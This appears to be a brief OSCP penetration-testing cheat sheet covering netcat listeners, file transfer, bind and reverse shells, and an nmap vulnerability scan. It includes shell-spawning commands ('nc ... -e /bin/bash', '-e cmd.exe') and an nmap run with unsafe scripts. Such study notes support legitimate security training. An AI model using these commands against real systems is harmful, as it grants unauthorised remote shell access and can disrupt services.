# Go-For-OSCP

# Tips
<b>Enable service on every reboot:</b>

update-rc.d <[service]> enable

<b>Extract link from html page:</b>

cat index.html | grep "href=" | cut -d "/" -f3| grep "debian.org" | cut -d '"' -f1 | sort -u

# Netcat
<b>Interact with application:</b>

nc -nv <[IP]> <[PORT]>

<b>Listener:</b>

nc -nlvp <[PORT]>

<b>File transfer (client):</b>

nc -nlvp <[PORT]> > <[FILE]>

<b>File transfer (server):</b>

nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>

# Bind vs Reverse Shell

<img src="https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Bind_Reverse_shell.png" width="500"/>

<b>Bind Shell:</b>

Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:

(BOB): nc -nlvp <[PORT]> -e cmd.exe

Alice connects to Bob's pc:

(ALICE): nc -nv <[BOB_IP]> <[PORT]>

<b>Reverse Shell:</b>

Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:

(ALICE): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash

Bob connects to Alice's pc:

(BOB): nc -nlvp <[PORT]>








# Nmap
nmap -sS -sV -A -O --script="*-vuln-*" --script-args=unsafe=1 <[IP]>
